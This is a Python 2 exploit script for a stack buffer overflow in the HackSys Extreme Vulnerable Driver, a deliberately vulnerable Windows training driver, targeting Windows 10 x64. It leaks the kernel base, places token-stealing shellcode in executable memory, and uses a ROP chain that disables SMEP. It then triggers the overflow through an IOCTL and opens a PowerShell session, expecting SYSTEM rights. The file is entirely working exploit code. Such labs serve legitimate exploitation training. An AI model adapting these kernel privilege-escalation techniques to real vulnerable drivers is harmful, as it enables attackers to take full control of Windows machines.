#!/usr/bin/python
#
# HEVD v3.00 BufferOverflowStack exploit for Windows 10 v1703 x64 by @acru3l.
#

import sys
import struct
from ctypes import *
from ctypes.wintypes import *

ioctl_BufferOverflowStack = 0x222003

device_name = r'\\.\HackSysExtremeVulnerableDriver'
hFile = None

def pusha():
    '''
    alernative to pusha on x86
    '''
    # assembled with metasm
    code = ''
    code += '\x50'                                      # push rax
    code += '\x53'                                      # push rbx
    code += '\x51'                                      # push rcx
    code += '\x52'                                      # push rdx
    code += '\x57'                                      # push rdi
    code += '\x56'                                      # push rsi
    code += '\x55'                                      # push rbp
    code += '\x41\x50'                                  # push r8
    code += '\x41\x51'                                  # push r9
    code += '\x41\x52'                                  # push r10
    code += '\x41\x53'                                  # push r11
    code += '\x41\x54'                                  # push r12
    code += '\x41\x55'                                  # push r13
    code += '\x41\x56'                                  # push r14
    code += '\x41\x57'                                  # push r15
    
    return code

def popa():
    '''
    alternative to popa on x86
    '''
    # assembled with metasm
    code = ''
    code += '\x41\x5f'                                  # pop r15
    code += '\x41\x5e'                                  # pop r14
    code += '\x41\x5d'                                  # pop r13
    code += '\x41\x5c'                                  # pop r12
    code += '\x41\x5b'                                  # pop r11
    code += '\x41\x5a'                                  # pop r10
    code += '\x41\x59'                                  # pop r9
    code += '\x41\x58'                                  # pop r8
    code += '\x5d'                                      # pop rbp
    code += '\x5e'                                      # pop rsi
    code += '\x5f'                                      # pop rdi
    code += '\x5a'                                      # pop rdx
    code += '\x59'                                      # pop rcx
    code += '\x5b'                                      # pop rbx
    code += '\x58'                                      # pop rax
    
    return code

def shellcode():
    '''
    token stealing shellcode
    '''
    # assembled with metasm
    code = ''
    code += pusha()
    code += '\x65\x48\x8b\x04\x25\x88\x01\x00\x00'      # mov rax,[gs:0x188]        ; 0x188 = offset nt!_KPCR.PcrbData.CurrentThread
    code += '\x48\x8b\x80\xb8\x00\x00\x00'              # mov rax,[rax+0xb8]        ; 0xB8  = offset nt!_KTHREAD.ApcState.Process
    code += '\x48\x89\xc3'                              # mov rbx,rax
    code += '\x48\x8b\x9b\xe8\x02\x00\x00'              # mov rbx,[rbx+0x2e8]       ; 0x2E8 = offset nt!_EPROCESS.ActiveProcessLinks.Flink
    code += '\x48\x81\xeb\xe8\x02\x00\x00'              # sub rbx,0x2e8
    code += '\x48\x8b\x8b\xe0\x02\x00\x00'              # mov rcx,[rbx+0x2e0]       ; 0x2E0 = offset nt!_EPROCESS.UniqueProcessId
    code += '\x48\x83\xf9\x04'                          # cmp rcx,4
    code += '\x75\xe5'                                  # jnz $-0x19
    code += '\x48\x8b\x8b\x58\x03\x00\x00'              # mov rcx,[rbx+0x358]       ; 0x358 = offset nt!_EPROCESS.Token
    code += '\x48\x89\x88\x58\x03\x00\x00'              # mov [rax+0x358],rcx
    code += popa()
    
    # recovering saved regs
    code += '\x48\xc7\xc3\x03\x00\x00\x00'              # mov rbx,3
    code += '\x48\xbe\xbb\x00\x00\xc0\x00\x00\x00\x00'  # mov rsi,0xc00000bb
    code += '\x48\xc7\xc7\x4d\x00\x00\x00'              # mov rdi,0x4d
    code += '\x4d\x31\xff'                              # xor r15,r15
    code += '\x4c\x8d\xb5\xd0\x00\x00\x00'              # lea r14,[rbp+0xd0]
    code += '\x4d\x31\xe4'                              # xor r12,r12
    code += '\x48\x83\xc4\x10'                          # add rsp,0x10
    code += '\xc3'                                      # ret
    
    return code

def alloc_buffer(data):
    windll.kernel32.VirtualAlloc.argtypes = [LPVOID, c_size_t, DWORD, DWORD]
    windll.kernel32.VirtualAlloc.restype = LPVOID
    
    buffer = windll.kernel32.VirtualAlloc(
        0,
        len(data),
        0x00003000,                                     # MEM_COMMIT | MEM_RESERVE
        0x40)                                           # PAGE_EXECUTE_READWRITE
    
    memmove(buffer, data, len(data))
    
    return buffer

def build_ropchain(kernel_base, shellcode_addr):
    '''
    trampoline to shellcode
    '''
    chain = ''
    chain += struct.pack('<Q', kernel_base + 0x597b)    # pop rcx; ret;
    chain += struct.pack('<Q', 0x00000000000506f8)      # disable SMEP
    chain += struct.pack('<Q', kernel_base + 0x108552)  # mov cr4, rcx; ret;
    chain += struct.pack('<Q', shellcode_addr)          # ret to userspace
    
    return chain

def open_device():
    '''
    (re)open vulnerable device
    '''
    global hFile
    
    if hFile > 0:
        windll.kernel32.CloseHandle(hFile)
    
    hFile = windll.kernel32.CreateFileA(
        device_name,
        0xC0000000,                                     # GENERIC_READ | GENERIC_WRITE
        0x00000001,                                     # FILE_SHARE_READ
        0,                                              # NULL
        3,                                              # OPEN_EXISTING
        0x80,                                           # FILE_ATTRIBUTE_NORMAL
        0)                                              # NULL
    
    if hFile == -1:
        print '[-] Failed to open device: %s' % device_name
        return False
    else:
        print '[+] Device opened successfully: %s' % device_name
        return True

def call_BufferOverflowStack(data):
    '''
    DeviceIoControl wrapper
    '''
    open_device()
    data_buff = create_string_buffer(data)
    bytes_retn = c_ulong(0)
    
    print '[+] Triggering stack buffer overflow'
    
    windll.kernel32.DeviceIoControl(
        hFile,
        ioctl_BufferOverflowStack,
        data_buff,
        len(data),
        0,
        0,
        byref(bytes_retn),
        0)

def get_kernel_base():
    '''
    find base address of the kernel via EnumDeviceDrivers
    '''
    array = c_ulonglong * 0x400
    addr = array()
    
    windll.psapi.EnumDeviceDrivers.argtypes = [POINTER(LPVOID), DWORD, POINTER(DWORD)]
    windll.psapi.EnumDeviceDrivers.restype = BOOL
    
    res = windll.psapi.EnumDeviceDrivers(
            cast(byref(addr), POINTER(LPVOID)),
            sizeof(addr),
            byref(c_ulong(0)))
    if not res:
        return None
    
    # Kernel is the first entry of the result
    return addr[0]

def get_device_name(addr):
    '''
    find file name of kernel via GetDeviceDriverBaseNameA
    '''
    buff = create_string_buffer(0x400)
    
    windll.psapi.GetDeviceDriverBaseNameA.argtypes = [LPVOID, LPCSTR, DWORD]
    windll.psapi.GetDeviceDriverBaseNameA.restype = DWORD
    
    res = windll.psapi.GetDeviceDriverBaseNameA(
            addr,
            buff,
            sizeof(buff))
    if res == 0:
        return None
    
    return buff[:res]

def break_code():
    import time
    time.sleep(0.5)
    windll.kernel32.DebugBreak()

if __name__ == '__main__':
    if not open_device():
        sys.exit(1)
    
    base_addr = get_kernel_base()
    if not base_addr:
        print '[-] Failed to obtain Kernel base'
        sys.exit(1)
    print '[+] Kernel base address: 0x%016x' % base_addr
    
    shellcode_addr = alloc_buffer(shellcode())
    if not shellcode_addr:
        print '[-] Failed to allocate shellcode'
        sys.exit(1)
    print '[+] Shellcode allocated at 0x%016x' % shellcode_addr
    
    ropchain = build_ropchain(base_addr, shellcode_addr)
    
    payload = 'A' * 0x818
    payload += ropchain
    
    # trigger stack buffer overflow
    call_BufferOverflowStack(payload)
    
    # Got SYSTEM shell?
    import os
    os.system('powershell.exe')
